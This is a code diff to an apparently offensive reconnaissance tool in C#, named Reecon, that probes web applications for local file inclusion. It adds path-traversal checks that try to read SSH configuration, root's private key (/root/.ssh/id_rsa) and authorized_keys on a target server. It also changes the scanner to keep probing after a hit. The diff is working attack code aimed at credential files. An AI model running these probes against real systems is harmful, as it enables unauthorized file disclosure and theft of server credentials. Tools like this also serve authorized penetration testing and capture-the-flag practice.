@@ -96,6 +96,17 @@ namespace Reecon
                     "/var/lib/tomcat9/webapps/ROOT/index.html"
                 };
                 DoLFI(linux_tomcat9);
+
+                // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
+                List<string> linux_ssh = new List<string>
+                {
+                    "/etc/ssh/ssh_config",
+                    "/etc/ssh/sshd_config",
+                    "/root/.ssh/id_rsa",
+                    "/root/.ssh/authorized_keys"
+                };
+                DoLFI(linux_ssh);
+
             }
             else if (OS == General.OS.Windows)
             {
@@ -173,44 +184,50 @@ namespace Reecon
             // If it must contain a word
             // php://filter/read=convert.base64-encode/wordhere/resource=flag
 
+            bool hasResult = false;
             foreach (string check in lfiChecks)
             {
+                bool hasResultCurrent = false;
                 // Check Base
                 string toCheck = initialPart + check;
                 try
                 {
                     int resultLength = wc.DownloadString(toCheck).Length;
-                    // - 6 = Lenght of the NotFound Search = Reelix
+                    // - 6 = Length of the NotFound Search = Reelix
                     if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6))
                     {
                         Console.WriteLine(resultLength + " -- " + toCheck);
                         // Don't need to try more if it's already true
-                        return true;
+                        hasResultCurrent = true;
+                        hasResult = true;
                     }
                 }
                 catch (Exception)
                 {
                     // Nope!
                 }
-                // Check with ../'s
-                toCheck = initialPart + "/../../../../.." + check;
-                try
+                // Check with ../'s if nothing has been found for this specific result
+                if (!hasResultCurrent)
                 {
-                    int resultLength = wc.DownloadString(toCheck).Length;
-                    // - 6 = Length of the NotFound Search = Reelix
-                    // + 15 = Length of the bypass
-                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6 + 15))
+                    toCheck = initialPart + "/../../../../.." + check;
+                    try
                     {
-                        Console.WriteLine(resultLength + " -- " + toCheck);
-                        return true;
+                        int resultLength = wc.DownloadString(toCheck).Length;
+                        // - 6 = Length of the NotFound Search = Reelix
+                        // + 15 = Length of the bypass
+                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6 + 15))
+                        {
+                            Console.WriteLine(resultLength + " -- " + toCheck);
+                            hasResult = true;
+                        }
                     }
-                }
-                catch (Exception)
-                {
-                    // Nope!
+                    catch (Exception)
+                    {
+                        // Nope!
+                    }
                 }
             }
-            return false;
+            return hasResult;
         }
     }
 }
